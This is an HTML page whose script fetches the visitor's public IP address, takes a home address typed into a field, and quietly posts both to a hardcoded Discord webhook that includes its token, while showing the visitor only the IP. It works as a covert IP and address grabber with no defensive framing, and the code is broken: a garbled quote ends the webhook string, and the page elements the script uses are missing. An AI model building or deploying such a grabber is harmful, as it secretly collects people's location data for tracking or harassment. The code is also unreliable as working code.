<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>E</title>
    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1295926374959415326/jcyJtej4wQvgp9FS_nimudItJO-PAFYbF6foxrUWtwyNVY7eu8sV2_1aMibNq3htq8Bpâ€™

        async function fetchIP() {
            const start = performance.now(); // Start timing

            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                document.getElementById('ip-display').innerText = `Your IP address is: ${data.ip}`;

                const address = document.getElementById('address-input').value;
                await sendToDiscord(data.ip, address);

                const end = performance.now(); // End timing
                console.log(`Fetch time: ${end - start} ms`); // Log the time taken
            } catch (error) {
                console.error('Error fetching IP:', error);
            }
        }

        async function sendToDiscord(ip, address) {
            const message = { content: `IP Address: ${ip} | Home Address: ${address}` };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }
    </script>
</head>

</body>
</html>
